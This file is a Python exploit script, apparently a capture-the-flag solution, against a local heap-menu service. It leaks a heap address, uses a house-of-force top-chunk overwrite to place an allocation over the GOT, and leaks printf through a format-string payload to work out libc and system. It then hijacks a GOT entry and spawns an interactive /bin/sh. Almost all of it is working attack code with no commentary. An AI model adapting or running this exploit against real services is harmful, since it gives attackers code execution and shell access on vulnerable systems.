import socket, struct, telnetlib


def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)


def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
      data += f.read(1)
    return data


def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


def p(a): return struct.pack("<I",a)
def u(a): return struct.unpack("<I",a)[0]
def p64(a): return struct.pack("<Q",a)
def u64(a): return struct.unpack("<Q",a)[0]


def new(size, content):
    read_until(f, '>>\n')
    f.write('1\n')

    print 'size = {}({})'.format(size, hex(size))
    read_until(f, 'content:')
    f.write(str(size) + '\n')

    read_until(f, 'content:')
    f.write((content+'\n')[:size])


def edit(id_, content):
    read_until(f, '>>\n')
    f.write('3  \n')

    read_until(f, 'id:')
    f.write(str(id_) + '\n')

    read_until(f, 'content:')
    f.write(str(content) + '\n')


def free(id_):
    read_until(f, '>>\n')
    f.write('4\n')

    read_until(f, 'id:')
    f.write(str(id_) + '\n')


s, f = sock("127.0.0.1", 4088)

read_until(f, 'name:\n')
print 'write name'
f.write('A'*0x40)

data = read_until(f, '!')[:-1]
print data
data = data[data.find('Hey ')+len('Hey '):].strip('A')
addr_heap = u(data.ljust(4, '\x00'))
print data
print 'addr_heap = {}'.format(hex(addr_heap))

read_until(f, 'Org:\n')
print 'write org'
f.write('B' * 0x40)

read_until(f, 'Host:\n')
print 'write host'
f.write('\xff\xff\xff\xff'+'\n') # top->size will be overwritten by this (house of force)

addr_top_now = addr_heap + 0xd4 - 0x4
addr_got_setvbuf = 0x804b034
evil_size = addr_got_setvbuf - addr_top_now - 4 * 0x4

print 'addr_top_now = {}'.format(hex(addr_top_now))
print 'evil_size = {}'.format(hex(evil_size))
new(evil_size, 'CCCC')

addr_printf_plt = 0x80484d0

buf = ''
buf += p(0x8048570+0x6) # addr memset plt + 0x6
buf += p(addr_printf_plt+0x6)


print 'this should return addr_got_setvbuf'
new(0x80, buf)

addr_printf_got = 0x804b010
buf = ''
buf += p(addr_printf_got)
buf += '!%6$s!!!!'
f.write(buf + '\n')

read_until(f, '!')
data = read_until(f, '!!!!')[:-4]

print 'data'
print data
print len(data)
print 'end data'

addr_printf = u(data[:4])
addr_libc = addr_printf - 0x49670
addr_system = addr_libc + 0x3ada0
print 'addr_printf = {}'.format(hex(addr_printf))
print 'addr_libc = {}'.format(hex(addr_libc))

buf = ''
buf += p(0x8048570+0x6) # addr memset plt + 0x6
buf += p(addr_system)

edit(1, buf)

read_until(f, '>>\n')
f.write('/bin/sh\x00\n')

shell(s)
